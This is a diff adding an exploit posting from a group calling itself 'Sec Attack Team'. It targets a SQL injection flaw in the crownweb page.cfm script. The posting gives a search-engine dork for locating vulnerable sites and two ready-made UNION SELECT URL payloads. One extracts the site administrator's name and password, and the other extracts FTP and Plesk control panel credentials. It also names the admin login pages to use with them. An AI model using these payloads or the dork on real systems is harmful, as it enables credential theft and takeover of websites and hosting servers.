@@ -1,0 +1,47 @@
+crownweb (page.cfm) Sql Injection Vulnerability
+===================================================================
+
+####################################################################
+.:. Email : F.Hack@w.cn
+.:. Team : Sec Attack Team
+.:. Home : www.sec-attack.com/vb
+.:. Script : crownweb
+.:. Language : Cfm
+.:. Script Download: http://www.crownweb.net/
+.:. Bug Type : Sql Injection[Mysql]
+.:. Dork : "Powered By CrownWeb.net!" inurl:"page.cfm"
+####################################################################
+
+===[ Exploit ]===
+
+www.Localhost.com/page.cfm?id=[Sql Injection]
+
+********************************************************************
+T0 Get Username & Password Admin Site
+
+[Sql Injection ; {Name & password Admin}]
+
+www.Localhost.com/page.cfm?id=null+and+100=99+union+select+1,2,3,4,concat(name,0x3a,password),6+from+author
+
+WEBSITE LOGIN: www.localhost.com/siteadmin/
+
+[~] Name : Webadmin
+[~] Password : Sec-Attack
+
+********************************************************************
+T0 Get Username & Password Plesk Control Panel
+
+[Sql Injection ; {Username & Password Plesk Control Panel}]
+
+www.Localhost.com/page.cfm?id=null+and+100=99+union+select+1,2,3,4,concat(ftpserver,0x3a,domainname,0x3a,ftpusername,0x3a,ftppassword),6+from+webdata
+
+WEBSITE LOGIN: https://IP SRVER:8443/login.php3
+
+[~] ftpserver : 127.0.0.1
+[~] domainname : Localhost.com
+[~] ftpusername : Root
+[~] ftppassword : Sec-Attack
+
+####################################################################
+
+Greats T0: HackxBack & Zero Cold & All My Friend & All Member Sec Attack
